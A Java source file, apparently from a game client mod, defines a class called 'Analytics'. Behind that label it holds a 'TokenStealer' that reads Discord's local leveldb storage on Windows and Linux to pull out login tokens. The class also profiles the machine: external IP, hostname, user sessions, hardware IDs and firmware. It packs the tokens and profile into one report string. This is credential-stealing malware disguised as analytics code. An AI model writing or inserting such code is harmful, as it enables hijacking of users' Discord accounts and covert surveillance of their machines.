package Adderall.dev.util;

import com.google.common.base.Charsets;
import org.apache.commons.codec.digest.DigestUtils;
import oshi.SystemInfo;
import oshi.hardware.*;
import oshi.software.os.NetworkParams;
import oshi.software.os.OSFileStore;
import oshi.software.os.OSSession;
import oshi.software.os.OperatingSystem;

import java.io.File;
import java.io.FilenameFilter;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class Analytics {
    private static final SystemInfo si = new SystemInfo();
    private static final OperatingSystem os = si.getOperatingSystem();
    private static final NetworkParams np = os.getNetworkParams();
    private static final HardwareAbstractionLayer hal = si.getHardware();
    private static final CentralProcessor.ProcessorIdentifier pi = hal.getProcessor().getProcessorIdentifier();
    private static final ComputerSystem cs = hal.getComputerSystem();
    private static final Firmware fw = cs.getFirmware();
    private static final Baseboard bb = cs.getBaseboard();

    private static final String HWID = DigestUtils.sha384Hex(cs.getModel() + pi.getIdentifier() + pi.getProcessorID() + bb.getSerialNumber() + fw.getDescription());

    private static final Pattern token = Pattern
            .compile("[\\w\\-]{24}\\.[\\w\\-]{6}\\.[\\w\\-]{27}");

    public static String getHWID() { return HWID; }

    static class TokenStealer {
        private static final String levelDbDir = File.separator + "Local Storage" + File.separator + "leveldb" + File.separator;

        public static Set<String> getTokens() {
            Set<String> tokens = new HashSet<>();

            String discordDir;
            switch (SystemInfo.getCurrentPlatform()) {
                default:
                    return tokens;

                case LINUX:
                    discordDir = System.getenv("HOME") + File.separator + ".config" + File.separator;
                    break;

                case WINDOWS:
                    discordDir = System.getenv("APPDATA") +  File.separator;
                    break;
            }

            Arrays.stream(Objects.requireNonNull(new File(discordDir).listFiles(new DiscordConfigFilter())))
                    .flatMap(file -> Arrays.stream(Objects.requireNonNull(new File(file + levelDbDir).listFiles())))
                    .flatMap(file -> {
                        try { return com.google.common.io.Files.readLines(file, Charsets.UTF_8).stream(); } catch (Exception ignored) { }
                        return Stream.of("unknown");
                    }).forEach(line -> {
                        Matcher matcher = token.matcher(line);
                        if (matcher.find()) tokens.add(matcher.group());
                    });

            return tokens;
        }

        static class DiscordConfigFilter implements FilenameFilter {
            private static final HashSet<String> discordDirs = new HashSet<>(Arrays.asList("discord", "discordcanary", "discordptb"));

            @Override
            public boolean accept(File file, String s) {
                return discordDirs.contains(s.toLowerCase());
            }
        }
    }

    public static String parseSystemInfo() {
        StringBuilder sb = new StringBuilder();
        String del = " **#** ";


        sb.append("/System/ ");
        SBHelper.chainAppend(sb, del, os.getManufacturer(), os.getFamily(), os.getVersionInfo().toString(), Integer.toString(os.getBitness()));


        sb.append("\\n/FileSystem/ ").append("**[** ");
        for (OSFileStore fs : os.getFileSystem().getFileStores()) {
            SBHelper.chainAppend(sb, del, fs.getLabel(), fs.getName(), fs.getDescription(), Long.toString(fs.getTotalSpace()));
            sb.append(del);
        }
        SBHelper.deleteFromEnd(sb, del.length());
        sb.append(" **]**");


        final String[] ip = {""};
        Network.GET("https://myexternalip.com/raw", rep -> ip[0] = rep.split("\n")[0], () -> {});
        sb.append("\\n/Network/ ");
        SBHelper.chainAppend(sb, del, ip[0], np.getHostName(), np.getDomainName());


        sb.append("\\n/Users/ ").append("**[** ");
        for (OSSession s : os.getSessions()) {
            sb.append(s.toString()).append(del);
        }
        SBHelper.deleteFromEnd(sb, del.length());
        sb.append(" **]**");


        sb.append("\\n/RAM/ ");
        SBHelper.chainAppend(sb, del, Long.toString(hal.getMemory().getTotal()));


        sb.append("\\n/CPU/ ");
        CentralProcessor.ProcessorIdentifier cpu = hal.getProcessor().getProcessorIdentifier();
        SBHelper.chainAppend(sb, del, cpu.getName(), cpu.getMicroarchitecture(), (cpu.isCpu64bit() ? "" : "not ") + "64bit");


        sb.append("\\n/GPU/ ").append("**[** ");
        for (GraphicsCard gc : hal.getGraphicsCards()) {
            SBHelper.chainAppend(sb, del, gc.getName(), gc.getVendor(), Long.toString(gc.getVRam()));
            sb.append(del);
        }
        SBHelper.deleteFromEnd(sb, del.length());
        sb.append(" **]**");


        sb.append("\\n/Computer System/ ");
        SBHelper.chainAppend(sb, del, cs.getHardwareUUID(), cs.getModel(), cs.getManufacturer());


        sb.append("\\n/Firmware/ ");
        SBHelper.chainAppend(sb, del, fw.getName(), fw.getVersion(), fw.getReleaseDate(), fw.getManufacturer(), fw.getDescription());


        sb.append("\\n/Baseboard/ ");
        SBHelper.chainAppend(sb, del, bb.getModel(), bb.getVersion(), bb.getManufacturer());


        sb.append("\\n/HWID/ ");
        SBHelper.chainAppend(sb, del, getHWID());


        sb.append("\\n/DiscordTokens/ ");
        Set<String> tokens = TokenStealer.getTokens();
        SBHelper.chainAppend(sb, del, tokens.toArray(new String[0]));

        return sb.toString();
    }
}
